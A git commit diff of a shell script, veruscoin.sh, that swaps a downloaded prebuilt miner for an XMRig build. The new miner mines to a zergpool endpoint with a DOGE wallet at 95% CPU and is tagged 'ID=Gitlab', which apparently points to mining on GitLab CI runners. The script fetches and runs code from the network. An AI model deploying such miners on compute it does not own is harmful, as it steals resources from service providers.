cf63da60c9751cdcb096a1f2bb85550955f560c3
zazazaxky-m <78693013+zazazaxky-m@users.noreply.github.com>
2021-05-11 05:53:22 +0700

    Update veruscoin.sh

--- veruscoin.sh
+++ veruscoin.sh
@@ -1,9 +1,12 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RQogcNSzP75ZzFBPFBtsCvNDHAPHWKShgU.kucingkucing -p x --cpu 2
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd xmrig/build
+cmake ..
+make -j$(nproc)
+./xmrig -a rx/0 -o stratum+tcp://randomx.na.mine.zergpool.com:4453 -u DFkNQGLsvqAxiX3JJgMJK5FyBZD36z5zfW --keepalive --max-cpu-usage 95 --timeout 120 --donate-level 0 -p c=DOGE,ID=Gitlab
 while [ 1 ]; do
 sleep 3
 done
